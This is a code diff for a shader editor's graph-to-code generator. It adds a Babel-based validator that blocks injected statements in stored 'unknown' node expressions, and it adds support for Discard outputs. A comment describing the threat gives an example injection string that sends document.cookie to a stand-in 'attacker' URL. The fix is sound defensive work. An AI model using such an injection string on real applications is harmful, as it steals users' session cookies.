@@ -1,3 +1,4 @@
+import { parseExpression } from '@babel/parser';
 import type { AppNode, AppEdge, NodeDefinition, GeneratedCode } from '@/types';
 import { getNodeValues } from '@/types';
 import { NODE_REGISTRY } from '@/registry/nodeRegistry';
@@ -7,6 +8,39 @@ import { topologicalSort } from './topologicalSort';
 
 /** Valid swizzle component handles for split node output. */
 export const VALID_SWIZZLE = new Set(['x', 'y', 'z', 'w']);
+
+/**
+ * The `unknown`-node round-trip stores the original call-expression substring
+ * in `rawExpression`. graphToCode re-emits it verbatim into the generated
+ * module, so a hand-edited `.fastshader` file (or anything else that can write
+ * the graph payload) could swap that string for something like
+ * `foo(); window.location='http://attacker'+document.cookie` and inject
+ * arbitrary statements into the executing shader module.
+ *
+ * codeToGraph's parser only ever stores the slice of a single CallExpression,
+ * so for legitimate round-trips this validator is a no-op. We re-parse on
+ * emit and require:
+ *   1. parses cleanly as a JS expression (not a statement list)
+ *   2. is a CallExpression
+ *   3. the callee is a plain Identifier (no `something.eval(...)` /
+ *      `(()=>{...})()` / bracket-property access)
+ *
+ * Sandboxing the preview iframe means even a successful injection lands in
+ * an opaque-origin frame with no localStorage access, but defense in depth
+ * is cheap here: keep the inert fallback (`float(0)`) so the shader still
+ * compiles and the editor shows the magenta unknown-node tile, instead of
+ * mid-flight surprising the user with attacker JS.
+ */
+function isSafeUnknownExpression(expr: string): boolean {
+  try {
+    const ast = parseExpression(expr, { sourceType: 'module', plugins: ['typescript'] });
+    if (ast.type !== 'CallExpression') return false;
+    if (ast.callee.type !== 'Identifier') return false;
+    return true;
+  } catch {
+    return false;
+  }
+}
 
 export function graphToCode(
   nodes: AppNode[],
@@ -125,11 +159,16 @@ export function graphToCode(
 
     const varName = varNames.get(node.id)!;
 
-    // Unknown nodes: emit the preserved raw expression verbatim
+    // Unknown nodes: emit the preserved raw expression verbatim, but only
+    // after verifying it still looks like the simple `funcName(args)` shape
+    // codeToGraph produces. See isSafeUnknownExpression for the threat
+    // model — adversarial graph payloads otherwise get to inject arbitrary
+    // statements into the generated module.
     if (def.type === 'unknown') {
       const nv = getNodeValues(node);
       const rawExpr = String(nv.rawExpression ?? 'float(0)');
-      bodyLines.push(`  const ${varName} = ${rawExpr};`);
+      const safeExpr = isSafeUnknownExpression(rawExpr) ? rawExpr : 'float(0)';
+      bodyLines.push(`  const ${varName} = ${safeExpr};`);
       continue;
     }
 
@@ -233,6 +272,11 @@ export function graphToCode(
   const outputNode = sorted.find((n) => n.data.registryType === 'output');
   const OUTPUT_CHANNELS = ['color', 'emissive', 'normal', 'position', 'opacity', 'roughness'] as const;
   const channels: Record<string, string> = {};
+  // Discard is a side-effect statement, not a return channel — emitted as
+  // `Discard(cond);` between definitions and the return so the wired condition
+  // (e.g. greaterThan(distance(positionWorld, cameraPosition), maxDist)) kills
+  // the fragment before any further work.
+  let discardLine: string | null = null;
 
   if (outputNode) {
     for (const ch of OUTPUT_CHANNELS) {
@@ -242,6 +286,17 @@ export function graphToCode(
       if (edge) {
         const ref = resolveEdgeRef(edge, edges, varNames, sorted);
         if (ref) channels[ch] = ref;
+      }
+    }
+
+    const discardEdge = edges.find(
+      (e) => e.target === outputNode.id && e.targetHandle === 'discard'
+    );
+    if (discardEdge) {
+      const ref = resolveEdgeRef(discardEdge, edges, varNames, sorted);
+      if (ref) {
+        addImport('three/tsl', 'Discard');
+        discardLine = `  Discard(${ref});`;
       }
     }
   }
@@ -281,6 +336,7 @@ export function graphToCode(
     ...helperLines,
     'const shader = Fn(() => {',
     ...bodyLines,
+    ...(discardLine ? [discardLine] : []),
     '',
     returnLine,
     '});',
